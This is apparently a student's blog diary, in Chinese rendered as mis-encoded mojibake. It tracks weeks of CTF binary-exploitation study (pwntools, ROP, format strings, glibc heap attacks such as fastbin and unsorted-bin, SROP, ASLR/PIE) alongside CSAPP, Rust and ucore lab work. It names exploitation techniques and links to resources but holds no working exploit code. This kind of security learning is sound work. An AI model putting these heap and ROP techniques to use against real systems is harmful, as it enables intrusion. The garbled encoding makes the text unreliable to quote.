</p><ul><li>çœ‹æ‡‚äº†python2å’Œpython3ä¸­çš„å­—ç¬¦ä¸²çš„<a href="https://blog.csdn.net/sinat_38682860/article/details/91046433">åŒºåˆ«</a>(å¤ä¹ äº†<a href="https://www.zhihu.com/question/23374078">Unicodeå’ŒUTF-8</a>), python3 åŠ ä¸Šçš„å°±æ˜¯è¿™ä¸¤ç§ç±»å‹<strong>ä¸èƒ½æ··ç”¨</strong> </li><li>æ•´æ˜ç™½äº†eipå¯„å­˜å™¨(<a href="https://www.cnblogs.com/xiangtingshen/p/11089563.html">1</a>,  <a href="https://www.k2zone.cn/?p=1911">2</a>)å’Œå †æ ˆå¹³è¡¡çš„ä¸œè¥¿, æ˜å¤©å†å†™ç¯‡æ–‡æ¡£é¡ºä¾¿æ•´ç†æ•´ç†è¶Šæ¥è¶Šå¤šçš„mdæ–‡ä»¶.</li></ul></li><li><p><strong>18:æ•´äº†ä¸ªblog, hexo+Github</strong>.</p></li></ul><h3 id="ç¬¬ä¸‰å‘¨-7-19-7-25"><a href="#ç¬¬ä¸‰å‘¨-7-19-7-25" class="headerlink" title="ç¬¬ä¸‰å‘¨: 7/19-7/25"></a>ç¬¬ä¸‰å‘¨: 7/19-7/25</h3><ul><li><p><strong>19: ç»ˆäºå¼„å®Œäº†githubä¸Šçš„blog, ä»¥åå°±è¿™æ ·å‘ä¸œè¥¿äº†</strong> </p><ul><li>python3 -m pydoc -p 0 : å¯ä»¥æŸ¥çœ‹æœ¬åœ°æ–‡æ¡£</li></ul></li><li><p><strong>20: ç™½å¤©çœ‹pythonçš„è¯­æ³•, çœ‹åˆ°äº†formatted_string, æ™šä¸Šç»§ç»­åšé¢˜BUUOJçœ‹LibcSearcher</strong> </p><ul><li><strong><a href="https://yogdzewa.github.io/2021-07/pwn-ROPgadgetDoc/">ROPgadgetDoc</a> or <a href="https://blog.csdn.net/weixin_45556441/article/details/114631043">anotherIntroduce</a></strong> </li><li>hideçš„æ–‡ç« å¯ä»¥é€šè¿‡ç½‘å€è®¿é—®</li><li>pwnæŸ¥æ‰¾å­—ç¬¦ä¸²çš„<a href="https://blog.csdn.net/weixin_43921239/article/details/105318835">æ–¹æ³•</a>.(æŒ‡æŸ¥æ‰¾ç¨‹åºä¸­çš„å­—ç¬¦ä¸²|æŸ¥æ‰¾ libc ä¸­çš„å­—ç¬¦ä¸²ä¹‹ç±»çš„)</li></ul></li><li><p><strong>21: ç»§ç»­OJ</strong> </p><ul><li>è™šæ‹Ÿæœºé‡Œvimçš„å¤åˆ¶ç²˜è´´å¥½åƒæœ‰ç‚¹ç‰¹åˆ«</li><li>ä»Šå¤©æ‰åšäº†ä¸¤é“é¢˜pwn+babyrop, æˆ‘è§‰å¾—éœ€è¦åæ€ä¸‹åˆ°åº•å“ªé‡Œæ…¢äº†<ul><li>ä¸»è¦è¿˜æ˜¯æƒ³è‡ªå·±æ‘¸ç´¢, ç»“æœå¥½å¤šä¸œè¥¿çœ‹åˆ«äººçš„å­¦å¾—æ›´å¿«, <strong>åˆå’å•</strong>å¤ä¹ äº†ä¸€é%næ˜¯ä¿®æ”¹<strong>æŒ‡é’ˆ</strong>æŒ‡å‘çš„å€¼(æºè‡ªCGfsb), cè¯­è¨€å‡½æ•°æœ‰ç‚¹ä¸å¤ªç†Ÿæ‚‰(strlenå°±æ˜¯, æ²¡ååº”è¿‡æ¥æ˜¯ä»¥â€™\0â€™ä¸ºæ­¢çš„, ä»¥åŠstrncmpè¿”å›å€¼å’Œç¬¬ä¸‰ä¸ªå‚æ•°å³é•¿åº¦ä¸º0æ—¶ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰), ä»Šå¤©çœ‹æ–‡æ¡£ä¹Ÿç”¨äº†ä¸å°‘æ—¶é—´(fmtstr_payload, flat, packç­‰), æ€»çš„è¯´æ¥å­¦å¾—è¿˜ç®—ä¸å°‘, ä¸è¿‡æ„Ÿè§‰è¿˜æ˜¯æœ‰ç‚¹æ…¢(ï½€âŒ’Â´ãƒ¡)</li></ul></li></ul></li><li><p><strong>22: ç»§ç»­</strong> </p><ul><li><p>linux <u>ç»ˆç«¯suspendé—®é¢˜</u>: pressing the ctrl+z is to suspended current process <a href="https://www.cnblogs.com/jiangzhaowei/p/8971265.html"><strong>[0]</strong></a>.</p></li><li><p>python3 ç”¨pwntoolsä»€ä¹ˆä¸œè¥¿éƒ½å¾—åŠ ä¸€ä¸ªb, ç»äº†.<br>â€œ/bin/shâ€æ²¡åŠ ä¹ŸæŠ¥é”™, è¿˜æœ‰ELF.searchè¿”å›çš„æ˜¯ä¸€ä¸ªå¯è¿­ä»£çš„å¯¹è±¡<br>sendlineafteræ²¡åŠ bä¹Ÿåœ¨é‚£é‡Œç»™è­¦å‘Š<br>ç®€å•é¢˜å¤šåšå‡ éè¿˜èƒ½å¤šå‡ æ¬¡æ”¶è·, å“‡, å“‡</p></li><li><p>IDA é€†å‘<a href="https://github.com/nihilus/hexrays_tools/blob/master/code/defs.h">å¸¸ç”¨å®å®šä¹‰</a> </p></li><li><p>pwntoolsçš„contexté»˜è®¤32ä½, è¿˜æ˜¯æ¯æ¬¡æ‰‹åŠ¨è®¾å®šçš„å¥½,  æ¨èä½¿ç”¨:<code>context.binary = &#39;./challenge-binary&#39;</code>.</p><img src="https://i.loli.net/2021/07/22/ueHT3S7ComhkflA.png" alt="image-20210722202114278" style="zoom: 67%;" /> </li><li><p>æŸ¥æ‰¾å­—ç¬¦ä¸²-&gt;flag.txt-&gt;Ctrl+X, Jumptothereference-&gt;ç»§ç»­</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-comment">//å¸¸è§å‡½æ•°:</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getc</span><span class="hljs-params">(FILE *stream)</span>                                   <span class="hljs-comment">//è¿”å›å­—ç¬¦çš„intç±»å‹å€¼</span></span><br><span class="hljs-function"><span class="hljs-keyword">char</span> *<span class="hljs-title">fgets</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *str, <span class="hljs-keyword">int</span> n, FILE *stream)</span></span>;              <span class="hljs-comment">//ä»æ–‡ä»¶æµä¸­è¯»å–å­—ç¬¦åˆ°strä¸­</span><br><span class="hljs-function">FILE *<span class="hljs-title">fopen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *filename, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *mode)</span></span>;    <span class="hljs-comment">//</span><br><span class="hljs-function"><span class="hljs-keyword">ssize_t</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *buf, <span class="hljs-keyword">size_t</span> nbyte)</span></span>;    <span class="hljs-comment">//ä¸€èˆ¬æ˜¯write(1,buf,nbyte),stdout = 1</span><br><span class="hljs-function"><span class="hljs-keyword">unsigned</span> __int64 <span class="hljs-title">sys_read</span><span class="hljs-params">(stdinput:<span class="hljs-number">0</span>, buf, size)</span></span><br><span class="hljs-function"><span class="hljs-comment">//ä¹ æƒ¯ä¸Šï¼Œæ ‡å‡†è¾“å…¥çš„æ–‡ä»¶æè¿°ç¬¦æ˜¯ 0ï¼Œæ ‡å‡†è¾“å‡ºæ˜¯ 1ï¼Œæ ‡å‡†é”™è¯¯ï¼ˆstandard errorï¼‰æ˜¯ 2ã€‚</span></span><br></code></pre></div></td></tr></table></figure></li></ul></li><li><p>bssæ®µåŸç†: executableæ–‡ä»¶ä¸­åªè®°å½•æœªåˆå§‹åŒ–å˜é‡çš„èµ·å§‹å’Œç»ˆæ­¢åœ°å€, åœ¨è¿è¡Œæ—¶æ“ä½œç³»ç»Ÿå°†è¿™éƒ¨åˆ†å†…å­˜æ¸…é›¶(é€šè¿‡åŒ¿åmmapæ˜ å°„.)</p></li><li><p>å¯ä»¥ç›´æ¥sendline, ä¸ä¸€å®šè¦ä¸€ç›´ç”¨sendlineafter.</p></li><li><p><strong>23: è¿˜æ˜¯ç»§ç»­</strong> </p><ul><li>å¤ä¹ äº†ä¸€ä¸‹<a href="https://www.cnblogs.com/tcctw/p/11333743.html">æ ˆå¸§å¯¹é½</a> </li><li>å‘ç°è‡ªå·±å¯¹linuxçš„ç³»ç»Ÿå‡½æ•°ä¸ç†Ÿå¯¼è‡´åšé¢˜ä¸æ¸…æ¥š(åŒ…æ‹¬/bin/shå’Œshæ˜¯ä¸€æ ·çš„, éƒ½åœ¨ç³»ç»Ÿè·¯å¾„é‡Œ), å‡†å¤‡é‡è¡¥CSAPPé‡Œçš„Linuxå‡½æ•°</li><li><a href="https://blog.csdn.net/zhizhengguan/article/details/112338314">getegidç­‰ç­‰</a> </li><li>æ˜å¤©è¡¥è¡¥CTF-WiKiä¸Šçš„ä¸œè¥¿, æ„Ÿè§‰è¿˜æŒºæœ‰ç”¨çš„(å› ä¸ºæœ€æ–°ä¸€é¢˜è¦ç”¨åˆ°fastbin attackâ€¦â€¦â€¦.)</li></ul></li><li><p><strong>24-25: è¡¥è¡¥çŸ¥è¯†</strong> </p><ul><li>å¤ä¹ äº†ä¸‹<a href="https://www.cnblogs.com/killerlegend/p/3906502.html">AT&amp;Tå’ŒInterlè¯­æ³•</a> </li><li>LONG_MAX = INT_MAX</li><li><h3 id="ç¬¬å››å‘¨-7-26-8-1"><a href="#ç¬¬å››å‘¨-7-26-8-1" class="headerlink" title="ç¬¬å››å‘¨: 7/26-8/1"></a>ç¬¬å››å‘¨: 7/26-8/1</h3></li></ul></li><li><p><strong>26-28: åˆ’æ°´+çœ‹CTF-WiKiä¸Šçš„heapå†…å®¹</strong> </p></li><li><p><strong>29: ç»§ç»­WiKi</strong> </p><ul><li><code>MALLOC_ALIGN_MASK = 2 * SIZE_SZ -1</code> </li><li>æˆ‘å±…ç„¶è¿˜åœ¨çœ‹WiKi, å…³é”®æ˜¯ä»–çš„ä¸œè¥¿ä¹Ÿå¤ªå¤šäº†å§, ä¹‹å‰è¿˜ä»¥ä¸ºå¯ä»¥è·³è¿‡çš„, ç»“æœå…¨éƒ½å¾—å€’å›å»çœ‹åŸç†å’Œä»£ç , è¿™æ³¢çœŸçš„æ˜¯å¤§æ„äº†. å †çš„ç›¸å…³å†…å®¹çœŸçš„å¥½é•¿</li><li>fastbinæ˜¯å•é“¾è¡¨, æ‰€ä»¥å…ƒç´ çš„ç”¨æˆ·æ•°æ®æ®µå‰å…«å­—èŠ‚æœ‰æ•°æ®, ä¸”æ˜¯fd</li><li><strong>fd_nextsizeï¼Œ bk_nextsize</strong>æ˜¯largebinsçš„æŒ‡é’ˆ<code>#define MIN_CHUNK_SIZE (offsetof(struct malloc_chunk, fd_nextsize))</code></li><li>è‡³å°‘åŒ…å«bkæŒ‡é’ˆ, largebinsçš„ç‰¹æœ‰æŒ‡é’ˆå¯ä»¥ä¸è¦</li><li>å¥‡äº†æ€ªäº†, çœ‹äº†åŠå¤©æ‰çœ‹å‡ºæ¥fastbinsé‡Œçš„é“¾è¡¨å¤´æŒ‡é’ˆæ•°ç»„çš„æ•°é‡æ˜¯<code>maxsize</code>çš„å­—èŠ‚æ•°, æ‰€ä»¥æ‰æœ‰<code>fastbin_index(chunksize(victim))</code>è¿™ç§ç”¨å­—èŠ‚æ•°å®šä½ä¸‹æ ‡çš„ç®—æ³•, å¥½åƒçœŸçš„æ²¡æœ‰ä¸€å¥æ˜ç™½çš„è¯è¯´æ˜è¿™ç©æ„å„¿, ç»äº†, çœ‹äº†åŠå¤©æºç æ‰çœ‹å‡ºæ¥â€¦â€¦..<br>è¿˜æ˜¯ä¹–ä¹–çœ‹æºç å§â€¦â€¦..</li></ul></li><li><p><strong>30:çœ‹æ‡‚äº†fastbinattack</strong></p><ul><li>nextchunckæ˜¯æŒ‡é«˜åœ°å€çš„é‚£ä¸€ä¸ª</li><li><strong>malloc_consolidate</strong> å‡½æ•°å¯ä»¥å°† fastbin ä¸­æ‰€æœ‰èƒ½å’Œå…¶å®ƒ chunk åˆå¹¶çš„ chunk åˆå¹¶åœ¨ä¸€èµ·ã€‚</li></ul></li><li><p>31: </p><ul><li><a href="https://github.com/longld/peda">gdb-peda</a> <h3 id="ç¬¬äº”å‘¨-8-2-8-8"><a href="#ç¬¬äº”å‘¨-8-2-8-8" class="headerlink" title="ç¬¬äº”å‘¨: 8/2-8/8"></a>ç¬¬äº”å‘¨: 8/2-8/8</h3></li></ul></li><li><p><strong>8/2 3: åšé¢˜</strong> </p><ul><li><a href="https://blog.csdn.net/weixin_43092232/article/details/105648769">pwndbgå’ŒPwngdb</a> </li><li>å…³äºgdb.attach(p)çš„<a href="https://www.jianshu.com/p/fc91ff8319e6">å‡ å¥è¯</a> </li><li>æŸ¥è¯¢å„ç‰ˆæœ¬libc.soæ–‡ä»¶çš„main_arena_offsetçš„<a href="https://github.com/coldwave96/libcoffset">å°å·¥å…·</a> </li><li><strong>è€Œä¸”recvæ˜¯ä»ç¼“å†²åŒºè·å–æ•°æ®, å¿…é¡»æŠŠå‰é¢çš„éƒ½å–å‡ºæ¥æ‰èƒ½å¤Ÿrecv(4)</strong> </li></ul></li><li><p><strong>8/4,5: åšé¢˜</strong> </p><ul><li>ç³»ç»Ÿè°ƒç”¨å·åœ¨32ä½å’Œ64ä½ç³»ç»Ÿæ˜¯ä¸ä¸€æ ·çš„. <a href="https://giantbranch.blog.csdn.net/article/details/78777938">æŸ¥è¯¢è¡¨</a> </li><li>å…³äºlibc_csuçš„å†…å®¹åœ¨<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_1">CTF_WiKi</a>ä¸­</li><li>additionally <strong>recursively dereferencing</strong> all pointers.<img src="https://i.loli.net/2021/08/04/GAxeO2D67LfbKPw.png" alt="image-20210804234240069" style="zoom:80%;" /></li><li>flatå’Œpackåªå¯¹æ•°å­—ç”Ÿæ•ˆ, å¯¹ä¸è¶³å››å­—èŠ‚æˆ–å…«å­—èŠ‚çš„æ•°æ®è¯·è‡ªè¡Œå¡«å……å®Œæ•´</li><li>gdb.attachç”¨æ³• <code>io = gdb.debug(&#39;./hello&#39;, [gdb_scrip])</code> æ³¨æ„è¦å†™è·¯å¾„</li><li>å·²æ”¾å¼ƒgdb.attach(), å®åœ¨æä¸æ˜ç™½æ€ä¹ˆç”¨</li></ul></li><li><p><strong>8/6: å­¦ä¹ </strong> </p><ul><li><p>gdbä¸­<strong>é»˜è®¤å…³é—­éšæœºåŒ–</strong>, ä½¿ç”¨show disable-randomizationæˆ–set disable-randomization offå…³é—­â€œ<strong>ç¦æ­¢éšæœºåŒ–</strong>â€</p><p><a href="https://www.dazhuanlan.com/ourlaputa/topics/975254">å…³äºASLRå’ŒPIEè¯¦ç»†å†…å®¹</a>, å‰è€…æ˜¯Linuxç³»ç»Ÿç‰¹æœ‰æ‰“ä¹±æ‰€æœ‰çš„ä¸œè¥¿, åè€…æ˜¯ç¼–è¯‘å™¨åŠ ä¸Šçš„ä¿æŠ¤æªæ–½, PIEä¼šæ‰“ä¹±bss text dataåŠ è½½åŸºå€, ä¸è¿‡è¿™æ˜¯ä¸€ä¸ªå›ºå®šå€¼, å½“æˆ‘ä»¬æ‰“å¼€äº†Linuxçš„ASLR 2æ‰èƒ½å¤ŸçœŸæ­£çš„<strong>éšæœº</strong>.</p></li><li><p>æ•´ç†writeup</p></li></ul></li><li><p><strong>8/7:ç»§ç»­</strong> </p><ul><li>çœ‹å®Œäº†å †çš„å…¨éƒ¨åŸºç¡€å†…å®¹, è¿˜å‰©ä¸‹å„ç§åˆ©ç”¨æ–¹æ³•æ²¡çœ‹</li><li>äº†è§£äº†ä¸€æ³¢<strong>SROP</strong>, å°è¯•å†™äº†ä¸€é¢˜(å…¶å®æ˜¯æŸé¢˜çš„ç¬¬äºŒç§æ–¹æ³•)</li><li>BUUOJå¥½å‡ é“éƒ½æ˜¯åšè¿‡çš„æˆ–è€…å¾ˆç›¸ä¼¼çš„é¢˜ç›®, ç›¸å½“äºå¤ä¹ äº†ä¹Ÿæ¯”è¾ƒåŸºç¡€</li></ul></li><li><p><strong>8/8:ç»§ç»­</strong> </p><ul><li>çœ‹äº†çœ‹æ ˆè½¬ç§»å’Œasm(shellcraft), ä»¥åŠ<a href="https://support.typora.io/Draw-Diagrams-With-Markdown/">Typoraçš„å›¾è¡¨æ–‡æ¡£</a> <a href="https://github.com/adrai/flowchart.js">[flowchart github]</a> <a href="https://mermaid-js.github.io/mermaid/#/flowchart">[mermaid]</a> </li><li>å­¦ä¹ unsorted bin attack, <code>main_arena</code> æ˜¯ä¸€ä¸ª <code>struct malloc_state</code> ç±»å‹çš„å…¨å±€å˜é‡</li><li><a href="https://github.com/shellphish/how2heap">heap exploitation: how2heap</a> </li></ul></li></ul><h3 id="ç¬¬å…­å‘¨-8-9-8-15"><a href="#ç¬¬å…­å‘¨-8-9-8-15" class="headerlink" title="ç¬¬å…­å‘¨: 8/9 - 8/15"></a>ç¬¬å…­å‘¨: 8/9 - 8/15</h3><ul><li><p><strong>8/9:ä»Šå¤©çœ‹GNU C Libraryæºç (å…³äºheap)</strong> </p><ul><li><a href="https://blog.csdn.net/weixin_43833642/article/details/104681190">glibcæºç ä¸‹è½½&amp;åœ¨çº¿é˜…è¯»åœ°å€åˆé›†</a> </li><li>å†™ç‚¹heapæºç çš„ç¬”è®°</li></ul></li><li><p><strong>8/10,11,12:ç»§ç»­æºç </strong></p><ul><li><a href="https://qzy.im/blog/2020/05/typora-integrate-the-latest-version-of-mermaid/">Typoraä¸æ”¯æŒæœ€æ–°Mermaidè¯­æ³•çš„è§£å†³åŠæ³•</a> </li><li>å­¦äº†ä¸‹mermaidçš„ç”¨æ³•(æˆ–è®¸å°†æ¥èƒ½ç”¨åˆ°), è¿˜æœ‰app.diagram.netçš„ç”»å›¾</li><li>æŒ‰ä½ctrlç”¨é¼ æ ‡ç‚¹å‡»å¤šä¸ªåœ°æ–¹å¯ä»¥åŒæ—¶ç¼–è¾‘</li><li>ååº­çš„glibcè§£æä¸­chunk sizeé“¾è¡¨å³ä¸ºlargebinçš„fd_nextsizeå’Œbk_nextsize</li><li>&lt;span id=â€jumpâ€&gt;è·³è½¬åˆ°çš„åœ°æ–¹&lt;/span&gt;    è·³è½¬æœ¬é¡µé”šç‚¹çš„æ–¹æ³•</li></ul></li><li><p><strong>8/13:æå®šmalloc.cä¸­é™¤äº†å¤šçº¿ç¨‹çš„æ‰€æœ‰æºç </strong> </p><ul><li>emmmmmæˆ‘æ˜¯ä¸æ˜¯è¦è¡¥è¡¥å¤šçº¿ç¨‹çš„ä¸œè¥¿, æ€»ä¸èƒ½ä¸€ç›´éƒ½ä¸çŸ¥é“å§, æ˜å¤©æˆ‘å»é—®é—®è¿˜èƒ½æ‹–åˆ°ä»€ä¹ˆæ—¶å€™å­¦(bushi)</li></ul></li><li><p><strong>8/14-15:å†™å„ç§bin attackçš„åˆ†ææ–‡, å†™å®Œæ‰“ç®—å…¥å‘ucore Lab1</strong> </p><ul><li><a href="https://blog.csdn.net/Katherine_hsr/article/details/79179622">makdownæ•°å­¦å…¬å¼</a> </li><li><a href="https://blog.csdn.net/xiaojin21cen/article/details/90292315">ä¿®æ”¹theme</a> </li></ul></li></ul><h3 id="ç¬¬ä¸ƒ-å…«å‘¨-8-16-8-29"><a href="#ç¬¬ä¸ƒ-å…«å‘¨-8-16-8-29" class="headerlink" title="ç¬¬ä¸ƒ,å…«å‘¨: 8/16-8/29"></a>ç¬¬ä¸ƒ,å…«å‘¨: 8/16-8/29</h3><ul><li><strong>bin attack &amp; easyheap</strong> <ul><li>å‡ºç°äº†glibcç‰ˆæœ¬é—®é¢˜, éœ€è¦å†å°†æºç åˆ†æå’Œæœ€æ–°ç‰ˆæœ¬<code>2.34</code>æ¯”å¯¹ä¸€ä¸‹ </li><li>ç›´æ¥æ‰§è¡Œ.soæ–‡ä»¶æ¥æŸ¥çœ‹glibcç‰ˆæœ¬</li><li><a href="https://www.cnblogs.com/qisi007/p/13731562.html">Gittalkæ’ä»¶</a> </li></ul></li><li><strong>è¡¥å®Œäº†CSAPPä¸Šsignalçš„éƒ¨åˆ†, ä¸å¾—ä¸è¯´å†…å®¹çœŸçš„æ˜¯å¤ªå¤šäº†</strong> </li></ul><h3 id="ç¬¬ä¹å‘¨-8-30-9-5"><a href="#ç¬¬ä¹å‘¨-8-30-9-5" class="headerlink" title="ç¬¬ä¹å‘¨: 8/30-9/5"></a>ç¬¬ä¹å‘¨: 8/30-9/5</h3><ul><li><strong>å¿—æ„¿è€…+shellab</strong> <ul><li>getopt()    strchr()</li><li><strong>Ctrl+z</strong> å‘é€çš„æ˜¯ <strong>SIGTSTP</strong> </li><li>Kali ä¸Šunsigned long inté•¿8å­—èŠ‚, æˆ‘åœ¨windowsä¸Šç”¨g++æ˜¯4å­—èŠ‚å’Œintä¸€æ ·é•¿</li><li>architecturelabè¿˜æ²¡åš, éƒ½ä¸çŸ¥é“è¦ä¸è¦å¼„äº†, ä¹¦ä¸Šå¥½å¤šè¿˜æ²¡çœ‹åˆå¾—è¦å‡ å¤©</li><li>ç»§ç»­CSAPP, æ€ä¹ˆè¿˜æ²¡çœ‹å®Œå•Šâ€¦â€¦.</li><li><em><strong>é‡å¤§æ•™è®­</strong></em>, åœ¨Z-Libraryä¸Šæ‰¾åˆ°äº†csappçš„è‹±æ–‡éæ‰«æç‰ˆ, ç»ˆäºä¸ç”¨åœ¨ç¬”è®°æ’ç‰ˆä¸Šæµªè´¹é‚£ä¹ˆå¤šçš„æ—¶é—´äº†</li><li>8/5 çœ‹åˆ°äº†å¤„ç†å™¨ä½“ç³»ç»“æ„ç¬¬ä¸‰èŠ‚</li></ul></li></ul><h3 id="ç¬¬åå‘¨-9-6-9-12"><a href="#ç¬¬åå‘¨-9-6-9-12" class="headerlink" title="ç¬¬åå‘¨: 9/6-9/12"></a>ç¬¬åå‘¨: 9/6-9/12</h3><ul><li><strong>CSAPP</strong> <ul><li>process architectureçœ‹äº†ä¸€å¤©åŠçœ‹ä¸ä¸‹å»äº†, è¿˜æœ‰å‰©ä¸‹çš„Network &amp; Concurrent Programmingä»¥åå†æ‰¾æœºä¼šçœ‹å§</li></ul></li><li><strong>Rust</strong> <ul><li><u>çœ‹äº†äº”å¤©çš„Rust Official Document</u>, ç›¸å½“äºæ˜¯åº”äº†è‚–è€å¸ˆçš„å»ºè®®, ä¸è¿‡çœ‹äº†ä¸€å¤§åŠä¹‹åè¿˜èƒ½ç»§ç»­åšä»€ä¹ˆè¿˜æ²¡æœ‰æ€è€ƒ, ä¸è¿‡å¤§æ¦‚ç‡ä¸å»åšç½‘é¡µç»„çš„äº‹æƒ…äº†</li><li>å¦„å›¾å’Œè‚–å“¥æ¯”ç¡®å®æ˜¯ä¸€ç§è‡ªä¸é‡åŠ›çš„è¡Œä¸º, æˆ‘è¦å¥½å¥½åæ€ä¸€ä¸‹è‡ªå·±è¦èµ°çš„è·¯</li></ul></li><li><strong>BUUOJ</strong> <ul><li>åšä¸ªå‡ é¢˜æ„æ€ä¸€ä¸‹</li></ul></li></ul><h3 id="ç¬¬åä¸€å‘¨-9-13-9-19"><a href="#ç¬¬åä¸€å‘¨-9-13-9-19" class="headerlink" title="ç¬¬åä¸€å‘¨: 9/13-9/19"></a>ç¬¬åä¸€å‘¨: 9/13-9/19</h3><ul><li><strong>åˆçœ‹äº†ä¸€ä¸‹<a href="http://www.voidcn.com/article/p-yxixqubd-bmr.html">checksec</a>çš„ä¿æŠ¤æœºåˆ¶</strong> </li><li>å‡†å¤‡äº†ä¸€æ‰‹CCF CSP, è™½ç„¶æ²¡å­¦ç®—æ³•çš„å¤§å®¶éƒ½æ˜¯ä¸€ä¸ªæ°´å¹³</li><li>åšä¸ªä¸¤é¢˜</li></ul><h3 id="ç¬¬åäºŒå‘¨-9-20-9-26"><a href="#ç¬¬åäºŒå‘¨-9-20-9-26" class="headerlink" title="ç¬¬åäºŒå‘¨: 9/20-9/26"></a>ç¬¬åäºŒå‘¨: 9/20-9/26</h3><ul><li>IDA pro bookæ„Ÿè§‰æŒºæœ‰ç”¨çš„, æŠ½ä¸ªæ—¶é—´çœ‹çœ‹</li><li>ä¸Šé¢è¿™æœ¬ä¹¦ä¸­çš„ä¸€éƒ¨åˆ†çš„åšå®¢: <a href="https://blog.csdn.net/andiao1218/article/details/101192650">åç§°ä¸å‘½å</a>, è®²å¦‚ä½•æ›´æ”¹å‡½æ•°æˆ–å˜é‡åç§°</li><li>vim<a href="https://blog.csdn.net/cbaln0/article/details/87979056">æŸ¥æ‰¾ä¸æ›¿æ¢</a> </li><li>é¢è¯•V&amp;Nçš„pwnæ–¹å‘, å’Œå½“æ—¶çš„è‚–å­¦é•¿å·®ä¸å¤šæ°´å¹³, ä½†æ˜¯ç°åœ¨çš„é¢è¯•æ¯”è¾ƒä¸¥æ ¼, å«æˆ‘å†å­¦ä¸¤ä¸ªæœˆ, æˆ‘ç°åœ¨é€€å‘pwnå»èµ°ä¸€éè‚–å­¦é•¿çš„learn listè¡¥è¡¥åŸºç¡€(ç¼–è¯‘åŸç†å’Œæ“ä½œç³»ç»Ÿ)</li><li>å¤ªå¿™äº†, æç»¼æµ‹, åˆæ²¡å‘¨æœ«, å®éªŒåˆå¤š, ä¸‹å‘¨å†å­¦å§</li></ul><h2 id="æ“ä½œç³»ç»Ÿ-ç¼–è¯‘åŸç†"><a href="#æ“ä½œç³»ç»Ÿ-ç¼–è¯‘åŸç†" class="headerlink" title="æ“ä½œç³»ç»Ÿ+ç¼–è¯‘åŸç†"></a>æ“ä½œç³»ç»Ÿ+ç¼–è¯‘åŸç†</h2><h3 id="ç¬¬åä¸‰å‘¨-9-27-10-7-8-9-10-å›½åº†å…¨ç®—è¿›å»å§"><a href="#ç¬¬åä¸‰å‘¨-9-27-10-7-8-9-10-å›½åº†å…¨ç®—è¿›å»å§" class="headerlink" title="ç¬¬åä¸‰å‘¨: 9/27-10/7+8+9+10(å›½åº†å…¨ç®—è¿›å»å§)"></a>ç¬¬åä¸‰å‘¨: 9/27-10/7+8+9+10(å›½åº†å…¨ç®—è¿›å»å§)</h3><ul><li><p><strong>10/1-2 : ç¼–è¯‘åŸç†</strong></p><ul><li>åˆšå¼€å§‹ç¼–è¯‘åŸç†ï¼Œæ“ä½œç³»ç»Ÿçš„è¯çœ‹çœ‹æœ‰æ— å¿…è¦åŒæ—¶è¿›è¡Œ</li><li>ç¼–è¯‘åŸç†æ¦‚å¿µè¿‡å¤š, æš‚ç¼“å‡ å¤©, ç°åœ¨å…ˆçœ‹æ“ä½œç³»ç»Ÿ</li><li>è¿™å‡ å¤©æ‰“ç®—çœ‹çœ‹CSAPPçš„å¹¶è¡Œéƒ¨åˆ†(tmdæ€ä¹ˆè¿˜æ²¡çœ‹å®Œ, ç¬”è®°ä¸åšäº†å°±ç”»ä¸ªçº¿å¥½äº†)</li></ul></li><li><p><strong>10/3 : æ“ä½œç³»ç»Ÿ</strong> </p><ul><li><p>åœ¨å¼„ucoreç¯å¢ƒ, åŠ å…¥äº†æ–°çš„vim<a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_2_3_1_softwares.html">å‘½ä»¤</a>, åŒ…æ‹¬<a href="https://www.cnblogs.com/marsggbo/p/12152374.html">è¿™ä¸ª</a>.</p></li><li><p><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/">ucoreå®éªŒå‚è€ƒä¹¦</a> </p></li><li><p>GCCå†…è”æ±‡ç¼–</p><ul><li><p><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_3_1_3_gcc_inline_asm.html">åŸºæœ¬å†…è”æ±‡ç¼–</a><br><code>&quot;asm&quot; å’Œ &quot;__asm__&quot;</code>, å¦‚æœ‰å¤šè¡Œæ¯ä¸€è¡Œéƒ½è¦åŠ ä¸Š <code>&quot;\n\t&quot;</code>,<br>å®é™…ä¸Šgccåœ¨å¤„ç†æ±‡ç¼–æ—¶ï¼Œæ˜¯è¦æŠŠasm(â€¦)çš„å†…å®¹â€æ‰“å°â€åˆ°æ±‡ç¼–æ–‡ä»¶ä¸­ï¼Œæ‰€ä»¥<strong>æ ¼å¼æ§åˆ¶å­—ç¬¦</strong>æ˜¯å¿…è¦çš„ã€‚</p></li><li><p><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_3_1_4_extend_gcc_asm.html">æ‰©å±•å†…è”æ±‡ç¼–</a> è¯¦è§ç½‘ç«™ å¥½å¤æ‚, ç”¨æ—¶å†çœ‹</p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-keyword">asm</span> [<span class="hljs-keyword">volatile</span>] ( Assembler Template<br>   : Output Operands<br>   [ : Input Operands<br>   [ : Clobbers ] ] )<br></code></pre></div></td></tr></table></figure></li></ul></li><li><p><a href="https://chyyuu.gitbooks.io/ucore_os_docs/content/lab0/lab0_2_3_3_gdb.html">gdbåŸºæœ¬å‘½ä»¤ä»¥åŠçª—å£å‘½ä»¤</a> </p></li><li><p>ä¸‹åˆæ”¹å­¦ç¼–è¯‘åŸç†</p></li></ul></li><li><p><strong>10/4 : ç¼–è¯‘åŸç†</strong> </p><ul><li><a 